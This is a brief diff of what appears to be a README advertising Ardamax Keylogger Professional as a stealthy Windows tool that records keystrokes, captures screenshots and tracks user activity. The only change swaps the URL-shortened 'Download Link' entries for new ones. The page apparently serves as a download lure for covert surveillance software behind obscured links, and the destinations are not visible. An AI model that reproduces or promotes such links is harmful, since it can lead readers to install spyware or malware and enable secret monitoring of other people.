@@ -2,9 +2,9 @@
 
 Ardamax Keylogger Professional is a stealthy monitoring tool that records keystrokes, captures screenshots, and tracks user activity on Windows systems, often used for surveillance or security purposes.
 
-## [➤➤ Download Link](https://tinyurl.com/3bstr8xc)
+## [➤➤ Download Link](https://tinyurl.com/yt3w8jhr)
 
-## [➤➤ Download Link](https://tinyurl.com/3bstr8xc)
+## [➤➤ Download Link](https://tinyurl.com/yt3w8jhr)
 
 ### **Use Cases**
 
